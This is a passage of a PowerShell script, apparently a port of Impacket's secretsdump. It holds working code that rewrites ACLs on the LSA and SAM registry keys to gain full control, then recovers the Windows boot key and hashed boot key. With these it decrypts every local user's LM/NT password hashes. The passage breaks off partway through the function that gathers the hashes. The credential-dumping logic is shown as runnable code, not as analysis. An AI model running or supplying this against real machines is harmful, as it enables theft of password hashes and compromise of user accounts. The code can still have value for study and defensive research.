	$Global:ALGORITHMS["CALG_SSL3_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SSL3_MASTER)
	$Global:ALGORITHMS["CALG_SCHANNEL_MASTER_HASH"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SCHANNEL_MASTER_HASH)
	$Global:ALGORITHMS["CALG_SCHANNEL_MAC_KEY"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SCHANNEL_MAC_KEY)
	$Global:ALGORITHMS["CALG_SCHANNEL_ENC_KEY"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SCHANNEL_ENC_KEY)
	$Global:ALGORITHMS["CALG_PCT1_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_PCT1_MASTER)
	$Global:ALGORITHMS["CALG_SSL2_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SSL2_MASTER)
	$Global:ALGORITHMS["CALG_TLS1_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_TLS1_MASTER)
	$Global:ALGORITHMS["CALG_RC5"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_RC5)
	$Global:ALGORITHMS["CALG_HMAC"] = [Uint64]($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_HMAC)
	$Global:ALGORITHMS["CALG_TLS1PRF"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_TLS1PRF)
	$Global:ALGORITHMS["CALG_HASH_REPLACE_OWF"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_HASH_REPLACE_OWF)
	$Global:ALGORITHMS["CALG_AES_128"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES_128)
	$Global:ALGORITHMS["CALG_AES_192"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES_192)
	$Global:ALGORITHMS["CALG_AES_256"] = [Uint64]($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES_256)
	$Global:ALGORITHMS["CALG_AES"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES)
	$Global:ALGORITHMS["CALG_SHA_256"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA_256)
	$Global:ALGORITHMS["CALG_SHA_384"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA_384)
	$Global:ALGORITHMS["CALG_SHA_512"] = [Uint64]($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA_512)
	$Global:ALGORITHMS["CALG_ECDH"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH -bor $Global:ALG_SID_ECDH)
	$Global:ALGORITHMS["CALG_ECMQV"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_ECMQV)
	$Global:ALGORITHMS["CALG_ECDSA"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_DSS -bor $Global:ALG_SID_ECDSA)

	$Global:SYMMETRIC_MODE_CBC = 1
	$Global:SYMMETRIC_MODE_ECB = 0

	$Global:ALGORITHMS_DATA = @{}
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_SHA"]] = ([Math]::Floor(160/8), "SHA1", $Global:Null, $Global:Null, [Math]::Floor(512/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_HMAC"]] = ([Math]::Floor(160/8), "SHA512", $Global:Null, $Global:Null, [Math]::Floor(512/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_3DES"]] = ([Math]::Floor(192/8), "DES3", $Global:SYMMETRIC_MODE_CBC, [Math]::Floor(64/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_SHA_512"]] = ([Math]::Floor(128/8), "SHA512", $Global:Null, $Global:Null, [Math]::Floor(1024/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_AES_256"]] = ([Math]::Floor(256/8), "AES", $Global:SYMMETRIC_MODE_CBC, [Math]::Floor(128/8))

	$Global:FLAGS = @{}
	$Global:FLAGS["CRYPTPROTECT_UI_FORBIDDEN"] = 0x1
	$Global:FLAGS["CRYPTPROTECT_LOCAL_MACHINE"] = 0x4
	$Global:FLAGS["CRYPTPROTECT_CRED_SYNC"] = 0x8
	$Global:FLAGS["CRYPTPROTECT_AUDIT"] = 0x10
	$Global:FLAGS["CRYPTPROTECT_VERIFY_PROTECTION"] = 0x40
	$Global:FLAGS["CRYPTPROTECT_CRED_REGENERATE"] = 0x80
	$Global:FLAGS["CRYPTPROTECT_SYSTEM"] = 0x20000000
}

<#
	From PS some Windows API registry functions are not implemented
	Have to use C#
#>
function LoadRegAPI
{
	# RegOpenKeyEx()
	# RegQueryInfoKey()
	# RegQueryValueEx()
	# RegCloseKey()
	$WinRegistry = @"
	[DllImport("advapi32.dll")]
	public static extern int RegOpenKeyEx(
		int hKey,
		string lpSubKey,
		int ulOptions,
		int samDesired,
		ref int phkResult);

	[DllImport("advapi32.dll")]
	public static extern int RegQueryInfoKey(
		int hkey,
		StringBuilder lpClass,
		ref int lpcchClass,
		int lpReserved,
		ref int lpcSubKeys,
		ref int lpcbMaxSubKeyLen,
		ref int lpcbMaxClassLen,
		ref int lpcValues,
		ref int lpcbMaxValueNameLen,
		ref int lpcbMaxValueLen,
		ref int lpcbSecurityDescriptor,
		ref int lpftLastWriteTime);

	[DllImport("advapi32.dll")]
	public static extern int RegQueryValueEx(
		int hKey,
		string lpValueName,
		int lpReserved,
		ref int lpType,
		byte[] lpData,
		ref int lpcbData);

	[DllImport("advapi32.dll")]
	public static extern int RegCloseKey(
		int hKey);

"@
	$Global:WinRegAPI = Add-Type $WinRegistry -Name Reg -Using System.Text -PassThru
}

function Get-RegKeyClass($Key, $SubKey)
{
	# Load C# Registry Key functions
	If (-Not (Test-Path Variable:Global:WinRegAPI))
	{
		LoadRegApi
	}

	Switch ($Key) {
		"HKCR" { $nKey = 0x80000000} #HK Classes Root
		"HKCU" { $nKey = 0x80000001} #HK Current User
		"HKLM" { $nKey = 0x80000002} #HK Local Machine
		"HKU"  { $nKey = 0x80000003} #HK Users
		"HKCC" { $nKey = 0x80000005} #HK Current Config
		default {
			Write-Error "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
			return $Null
		}
	}

	$hKey = [IntPtr]::Zero
	$Result = $Global:WinRegAPI::RegOpenKeyEx($nKey, $SubKey, 0, 0x19, [ref]$hKey)
	If ($Result -eq 0)
	{
		$ClassVal = New-Object Text.StringBuilder 1024
		$Len = [Int]1024
		$Result = $Global:WinRegAPI::RegQueryInfoKey($hKey, $ClassVal, [ref]$Len, 0, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null)
		If ($Result -eq 0)
		{
			$Global:WinRegAPI::RegCloseKey($hKey) | Out-Null
			return $ClassVal.ToString()
		}
		Else
		{
			Write-Error "RegQueryInfoKey() failed"
			return $Null
		}
	}
	Else
	{
		Write-Error "RegOpenKeyEx() failed"
		return $Null
	}
}

function Get-RegKeyPropertyValue($Key, $SubKey, $Property)
{

	# Load C# Registry Key functions
	If (-Not (Test-Path Variable:Global:WinRegAPI))
	{
		LoadRegApi
	}

	Switch ($Key) {
		"HKCR" { $nKey = 0x80000000} #HK Classes Root
		"HKCU" { $nKey = 0x80000001} #HK Current User
		"HKLM" { $nKey = 0x80000002} #HK Local Machine
		"HKU"  { $nKey = 0x80000003} #HK Users
		"HKCC" { $nKey = 0x80000005} #HK Current Config
		default {
			throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
		}
	}

	$hKey = [IntPtr]::Zero
	$Result = $Global:WinRegAPI::RegOpenKeyEx($nKey, $SubKey, 0, 0x19, [ref]$hKey)
	If ($Result -eq 0)
	{
		$ValueLen = [Int]0
		$Result = $Global:WinRegAPI::RegQueryValueEx($hKey, $Property, 0, [ref]$Null, $Null, [ref]$ValueLen)
		If ($Result -eq 0)
		{
			$Value = New-Object byte[] $ValueLen
			$Result = $Global:WinRegAPI::RegQueryValueEx($hKey, $Property, 0, [ref]$Null, $Value, [ref]$ValueLen)
			If ($Result -eq 0)
			{
				$Global:WinRegAPI::RegCloseKey($hKey) | Out-Null
				return $Value
			}
			Else
			{
				Write-Error "RegQueryValueEx() failed to retrieve value"
				return $Null
			}
		}
		Else
		{
			Write-Error "RegQueryValueEx() failed to compute value length"
			return $Null
		}
	}
	Else
	{
		Write-Error "RegOpenKeyEx() failed"
		return $Null
	}
}

<#####################################################################>
<#####################################################################>
<#
<# THESE FUNCTIONS ARE INTERESTING FOR UNDERSTANDING WINDOWS SECRETS #>
<#
<#####################################################################>
<#####################################################################>

<#######>
<# SAM #>
<#######>

<#
	Get-SAM:
		1- Get-BootKey
		2- Get-HBootKey with BootKey
		3- Parse SAM registry and decrypt/deobfuscate LM/NT hashes with BootKey and HashedBootKey
#>

function Get-BootKey
{
	<#
		Get-BootKey: Compute BootKey (or SysKey) from HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD|Skew1|GBG|Data
			1- Get concatenation of "Class" info from RegQueryInfoKey() from HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD|Skew1|GBG|Data
			2- Apply permutations with the following table [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]
	#>
	
	Write-Host "`n[===] Retrieve Boot Key (or SysKey)"

	# Set full control for registry "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\CurrentControlSet\Control\Lsa', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	# Concatenation of "Class" info from RegQueryInfoKey() from HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD|Skew1|GBG|Data
	$String = [String]::Join("", $("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}))
	$Bytes = New-Object byte[] $($String.Length/2)
	0..$($Bytes.Length-1) | %{ $Bytes[$_] = [Convert]::ToByte($String.Substring($($_*2), 2), 16) }
	$BootKey = New-Object byte[] 16
	
	# Then string is permuted with the following table [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]
	0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{ $i=0 }{ $BootKey[$i]=$Bytes[$_]; $i++}

	# And we have the BootKey (or SysKey)
	$HexBootKey = [System.BitConverter]::ToString($BootKey).Replace("-", "")
	Write-Host ("[+] Boot Key = {0}" -f ($HexBootKey))

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	return $BootKey
}

function Get-HBootKey($BootKey)
{
	<#
		Get-HBootKey: Compute Hashed BootKey from BootKey
			1- Get registry key "HKLM\SAM\SAM\Domains\Account\F"
			2- Parse registry key and extract Key0
			3- Depending on Windows version:
				3.1- Version 1
					- RC4Key = MD5 (Salt + AQWERTY + BootKey + ANUM)
					- Hashed BootKey = RC4Encrypt(RC4Key, Key + Checksum)
				3.2- Version 2 (This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also), according to "secretsdump.py")
					- Hashed BootKey = AESDecrypt (BootKey, Data)
	#>
	
	Write-Host "`n[===] Compute Hashed Boot Key"
	
	$AQWERTY = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
	$ANUM = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")

	# Set full control for registry "HKLM\SAM\SAM\Domains\Account" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SAM\SAM\Domains\Account', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	# Get registry "HKLM\SAM\SAM\Domains\Account"
	$K = Get-Item HKLM:\SAM\SAM\Domains\Account

	If (-not $K)
	{
		Write-Error "Unable to retrieve registry 'HKLM:\SAM\SAM\Domains\Account'"
		return $Null
	}

	# We get the key "HKLM\SAM\SAM\Domains\Account\F"
	$DOMAIN_ACCOUNT_F = $K.GetValue("F")
	If (-not $DOMAIN_ACCOUNT_F)
	{
		Write-Error "Unable to retrieve key 'F' into registry 'HKLM:\SAM\SAM\Domains\Account'"
		return $Null
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	# Parse the key "HKLM\SAM\SAM\Domains\Account\F"
	# Structure from Impacket "secretsdump.py" : DOMAIN_ACCOUNT_F
	$Revision = $DOMAIN_ACCOUNT_F[0..3]
	$Unknown = $DOMAIN_ACCOUNT_F[4..7]
	$CreationTime = $DOMAIN_ACCOUNT_F[8..15]
	$DomainModifiedCount = $DOMAIN_ACCOUNT_F[16..23]
	$MaxPasswordAge = $DOMAIN_ACCOUNT_F[24..31]
	$MinPasswordAge = $DOMAIN_ACCOUNT_F[32..39]
	$ForceLogoff = $DOMAIN_ACCOUNT_F[40..47]
	$LockoutDuration = $DOMAIN_ACCOUNT_F[48..55]
	$LockoutObservationWindow = $DOMAIN_ACCOUNT_F[56..63]
	$ModifiedCountAtLastPromotion = $DOMAIN_ACCOUNT_F[64..71]
	$NextRid = $DOMAIN_ACCOUNT_F[72..75]
	$PasswordProperties = $DOMAIN_ACCOUNT_F[76..79]
	$MinPasswordLength = $DOMAIN_ACCOUNT_F[80..81]
	$PasswordHistoryLength = $DOMAIN_ACCOUNT_F[82..83]
	$LockoutThreshold = $DOMAIN_ACCOUNT_F[84..85]
	$Unknown2 = $DOMAIN_ACCOUNT_F[86..87]
	$ServerState = $DOMAIN_ACCOUNT_F[88..91]
	$ServerRole = $DOMAIN_ACCOUNT_F[92..93]
	$UasCompatibilityRequired = $DOMAIN_ACCOUNT_F[94..95]
	$Unknown3 = $DOMAIN_ACCOUNT_F[96..103]
	$Key0 = $DOMAIN_ACCOUNT_F[104..$($DOMAIN_ACCOUNT_F.Length-1)]
	# Commenting this, not needed and not present on Windows 2000 SP0
	# ('Key1',':', SAM_KEY_DATA)
	# ('Unknown4','<L=0')

	# Depending on Windows version : We have two type of structures of subpart Key0 from key "HKLM\SAM\SAM\Domains\Account\F"
	If ($Key0[0] -eq [byte]0x01)
	{
		# Structure from Impacket "secretsdump.py" : SAM_KEY_DATA
		$SAM_KEY_DATA = $Key0
		$Revision = $SAM_KEY_DATA[0..3]
		$Length = $SAM_KEY_DATA[4..7]
		$Salt = $SAM_KEY_DATA[8..23]
		$Key = $SAM_KEY_DATA[24..39]
		$CheckSum = $SAM_KEY_DATA[40..55]
		$Reserved = $SAM_KEY_DATA[56..63]

		# RC4Key = MD5 (Salt + AQWERTY + BootKey + ANUM)
		# Hashed BootKey = RC4Encrypt(RC4Key, Key + Checksum)
		$RC4Key = [Security.Cryptography.MD5]::Create().ComputeHash($Salt + $AQWERTY + $BootKey + $ANUM)
		$HBootKey = (NewRC4 $RC4Key).Transform($Key + $CheckSum)
		$NewCheckSum = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..15] + $ANUM + $HBootKey[0..15] + $AQWERTY)

		If (@(Compare-Object $NewCheckSum $HBootKey[16..$($HBootKey.Length-1)] -SyncWindow 0).Length -ne 0)
		{
			Write-Error "Hashed BootKey checksum failed, Syskey startup password probably in use"
			return $Null
		}
		
		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
		return $HBootKey
	}
	# Else : This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also), according to "secretsdump.py"
	ElseIf ($Key0[0] -eq [byte]0x02)
	{
		# Structure from Impacket "secretsdump.py" : SAM_KEY_DATA_AES
		$SAM_KEY_DATA_AES = $Key0
		$Revision = $SAM_KEY_DATA_AES[0..3]
		$Length = $SAM_KEY_DATA_AES[4..7]
		$CheckSumLen = $SAM_KEY_DATA_AES[8..11]
		$DataLen = $SAM_KEY_DATA_AES[12..15]
		$Salt = $SAM_KEY_DATA_AES[16..31]
		$Data = $SAM_KEY_DATA_AES[32..$($SAM_KEY_DATA_AES.Length-1)]

		# Hashed BootKey = AESDecrypt (BootKey, Data, Salt)
		$HBootKey = AESTransform $BootKey $Data[0..$([BitConverter]::ToInt32($DataLen, 0) - 1)] $Salt $False
		
		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
		return $HBootKey
	}
	Else
	{
		Write-Error '"F" key from "HKLM\SAM\SAM\Domains\Account" registry parsing error'
		return $Null
	}
}

function Get-UsersKeys
{
	<#
		Get-UsersKeys: Retrieve users' LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) into registry key "HKLM\SAM\SAM\Domains\Account\Users\<RID>\V"
			1- Get users' LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) into registry key "HKLM\SAM\SAM\Domains\Account\Users\<RID>\V"
	#>
	
	$UsersKeys = @()

	# Set full control for registry "HKLM\SAM\SAM\Domains\Account\Users" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SAM\SAM\Domains\Account\Users', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	ForEach ($Child in $(Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users))
	{
		If ($Child.PSChildName -match "^[0-9A-Fa-f]{8}$")
		{
			$UserKey = @{}
			$V = $Child.GetValue("V")

			# Structure from Impacket "secretsdump.py" : USER_ACCOUNT_V
			$UserKey['Unknown'] = $V[0..11]
			$UserKey['NameOffset'] = $V[12..15]
			$UserKey['NameLength'] = $V[16..19]
			$UserKey['Unknown2'] = $V[20..23]
			$UserKey['FullNameOffset'] = $V[24..27]
			$UserKey['FullNameLength'] = $V[28..31]
			$UserKey['Unknown3'] = $V[32..35]
			$UserKey['CommentOffset'] = $V[36..39]
			$UserKey['CommentLength'] = $V[40..43]
			$UserKey['Unknown3'] = $V[44..47]
			$UserKey['UserCommentOffset'] = $V[48..51]
			$UserKey['UserCommentLength'] = $V[52..55]
			$UserKey['Unknown4'] = $V[56..59]
			$UserKey['Unknown5'] = $V[60..71]
			$UserKey['HomeDirOffset'] = $V[72..75]
			$UserKey['HomeDirLength'] = $V[76..79]
			$UserKey['Unknown6'] = $V[80..83]
			$UserKey['HomeDirConnectOffset'] = $V[84..87]
			$UserKey['HomeDirConnectLength'] = $V[88..91]
			$UserKey['Unknown7'] = $V[92..95]
			$UserKey['ScriptPathOffset'] = $V[96..99]
			$UserKey['ScriptPathLength'] = $V[100..103]
			$UserKey['Unknown8'] = $V[104..107]
			$UserKey['ProfilePathOffset'] = $V[108..111]
			$UserKey['ProfilePathLength'] = $V[112..115]
			$UserKey['Unknown9'] = $V[116..119]
			$UserKey['WorkstationsOffset'] = $V[120..123]
			$UserKey['WorkstationsLength'] = $V[124..127]
			$UserKey['Unknown10'] = $V[128..131]
			$UserKey['HoursAllowedOffset'] = $V[132..135]
			$UserKey['HoursAllowedLength'] = $V[136..139]
			$UserKey['Unknown11'] = $V[140..143]
			$UserKey['Unknown12'] = $V[144..155]
			$UserKey['LMHashOffset'] = $V[156..159]
			$UserKey['LMHashLength'] = $V[160..163]
			$UserKey['Unknown13'] = $V[164..167]
			$UserKey['NTHashOffset'] = $V[168..171]
			$UserKey['NTHashLength'] = $V[172..175]
			$UserKey['Unknown14'] = $V[176..179]
			$UserKey['Unknown15'] = $V[180..203]
			$UserKey['Data'] = $V[204..$($V.Length-1)]

			$UserKey["PSChildName"] = $Child.PSChildName
			$UsersKeys += , $UserKey
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	return $UsersKeys
}

function Get-UserHashesDeobfuscated($UserKey, $HBootKey, $RID)
{
	<#
		Get-UserHashesDeobfuscated: Deobfuscate single UserKey = LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) and decrypt them
			1- Get-HBootKey with BootKey
			2- Get LM/NT hashes, from $UserKey["Data"] = LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V), depending on Windows version:
				2.1- If < Windows 10 v1607
					- From structure SAM_HASH get potential LM/NT hashes encrypted/obfuscated
				2.2- If >= Windows 10 v1607
					- From structure SAM_HASH_AES get potential LM/NT hashes encrypted/obfuscated
			3- Compute DES keys from user's RID
			4- Decrypt LM/NT hashes encrypted/obfuscated, depending on Windows version:
				4.1- If < Windows 10 v1607
					- RC4Key_LM/NT = MD5 (HashedBootKey[0:0x10] + RID + ALMPASSWORD/ANTPASSWORD)
					- Obf_LMHash/NTHash = RC4Encrypt (RC4Key_LM/NT, Enc_LMHash/NTHash)
				4.2- If >= Windows 10 v1607
					- Obf_LMHash/NTHash = AESDecrypt (HashedBootKey[0:0x10], Enc_LMHash/NTHash, SAM_HASH_AES_LM/NT[Salt])[0:0x10]
			5- Deobfuscate LMHash/NTHash = DESDecrypt (DESKeys[0], Obf_LMHash/NTHash[0:8]) + DESDecrypt (DESKeys[1], Obf_LMHash/NTHash[8:16])
	#>
	
	# Constants
	$ALMPASSWORD = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
	$ANTPASSWORD = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
	$emptyLM = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
	$emptyNT = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
	
	If ($HBootKey)
	{
		[byte[]]$Enc_LMHash = $Null
		[byte[]]$Enc_NTHash = $Null

		# Retrieve encrypted hashes depending Windows versions
		# Old style = < Windows 10 v1607
		# New style = >= Windows 10 v1607
		$NewStyle = $False
		If ($UserKey["Data"][[BitConverter]::ToInt32($UserKey["NTHashOffset"], 0) + 2] -eq [byte]0x01)
		{
			# Old style hashes
			If ([BitConverter]::ToInt32($UserKey["LMHashLength"], 0) -eq 20)
			{
				# LM Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH
				$LMHashOffset = [BitConverter]::ToInt32($UserKey["LMHashOffset"], 0)
				$LMHashLength = [BitConverter]::ToInt32($UserKey["LMHashLength"], 0)
				$SAM_HASH_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
				$PekID_LM = $SAM_HASH_LM[0..1]
				$Revision_LM = $SAM_HASH_LM[2..3]
				$Enc_LMHash = $SAM_HASH_LM[4..$($SAM_HASH_LM.Length - 1)]

			}
			If ([BitConverter]::ToInt32($UserKey["NTHashLength"], 0) -eq 20)
			{
				# NT Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH
				$NTHashOffset = [BitConverter]::ToInt32($UserKey["NTHashOffset"], 0)
				$NTHashLength = [BitConverter]::ToInt32($UserKey["NTHashLength"], 0)
				$SAM_HASH_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
				$PekID_NT = $SAM_HASH_NT[0..1]
				$Revision_NT = $SAM_HASH_NT[2..3]
				$Enc_NTHash = $SAM_HASH_NT[4..$($SAM_HASH_NT.Length - 1)]
			}
		}
		Else
		{
			# New style hashes
			$NewStyle = $True
			If ([BitConverter]::ToInt32($UserKey["LMHashLength"], 0) -gt 24)
			{
				# LM Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
				$LMHashOffset = [BitConverter]::ToInt32($UserKey["LMHashOffset"], 0)
				$LMHashLength = [BitConverter]::ToInt32($UserKey["LMHashLength"], 0)
				$SAM_HASH_AES_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
				$PekID_LM = $SAM_HASH_AES_LM[0..1]
				$Revision_LM = $SAM_HASH_AES_LM[2..3]
				$DataOffset_LM = $SAM_HASH_AES_LM[4..7]
				$Salt_LM = $SAM_HASH_AES_LM[8..23]
				$Enc_LMHash = $SAM_HASH_AES_LM[24..$($SAM_HASH_AES_LM.Length - 1)]
			}
			If ([BitConverter]::ToInt32($UserKey["NTHashLength"], 0) -gt 24)
			{
				# NT Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
				$NTHashOffset = [BitConverter]::ToInt32($UserKey["NTHashOffset"], 0)
				$NTHashLength = [BitConverter]::ToInt32($UserKey["NTHashLength"], 0)
				$SAM_HASH_AES_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
				$PekID_NT = $SAM_HASH_AES_NT[0..1]
				$Revision_NT = $SAM_HASH_AES_NT[2..3]
				$DataOffset_NT = $SAM_HASH_AES_NT[4..7]
				$Salt_NT = $SAM_HASH_AES_NT[8..23]
				$Enc_NTHash = $SAM_HASH_AES_NT[24..$($SAM_HASH_AES_NT.Length - 1)]
			}
		}

		[byte[]]$LMHash = $emptyLM
		[byte[]]$NTHash= $emptyNT
		$DESKeys = SIDToDESKeys($RID)
		If ($Enc_LMHash)
		{
			If (-not $NewStyle)
			{
				$RC4Key_LM = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ALMPASSWORD);
				$Obf_LMHash = (NewRC4 $RC4Key_LM).Transform($Enc_LMHash)
			}
			Else
			{
				$Obf_LMHash = (AESTransform $HBootKey[0..0x0f] $Enc_LMHash $Salt_LM $False)[0..0x0f]
			}

			$LMHash = (DESTransform $DESKeys[0] $Obf_LMHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_LMHash[8..$($Obf_LMHash.Length - 1)] $DESKeys[1] $False)
		}
		If ($Enc_NTHash)
		{
			If (-not $NewStyle)
			{
				$RC4Key_NT = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ANTPASSWORD)
				$Obf_NTHash = (NewRC4 $RC4Key_NT).Transform($Enc_NTHash)
			}
			Else
			{
				$Obf_NTHash = (AESTransform $HBootKey[0..0x0f] $Enc_NTHash $Salt_NT $False)[0..0x0f]
			}

			$NTHash = (DESTransform $DESKeys[0] $Obf_NTHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_NTHash[8..$($Obf_NTHash.Length - 1)] $DESKeys[1] $False)
		}

		return ($LMHash, $NTHash)
	}
	Else
	{
		return ($Null, $Null)
	}
}

function Get-SAM($BootKey)
{
	<#
		Get-SAM: BootKey -> Hashed BootKey -> We can decrypt LM/NT hashes
		All stuff is in Get-UserHashesDeobfuscated
	#>
	
	# Compute Hashed BootKey
	$HBootKey = Get-HBootkey $BootKey
	
	Write-Host "`n[===] Retrieve user's LM/NT Hashes and decrypt them with Boot Key"
	
	# Get users keys
	$UsersKeys = Get-UsersKeys

	# For each user keys extract LM/NT Hashes deobfuscated/unencrypted
	$SAM = @{}
	ForEach ($UserKey in $UsersKeys)
	{
		$UserInfo = @{}

		$UserName = [Text.Encoding]::Unicode.GetString($UserKey["Data"], [BitConverter]::ToInt32($UserKey["NameOffset"], 0), [BitConverter]::ToInt32($UserKey["NameLength"], 0))
		$RID = [Convert]::ToInt32($UserKey["PSChildName"], 16)
		$UserHashes = Get-UserHashesDeobfuscated $UserKey $HBootKey $RID
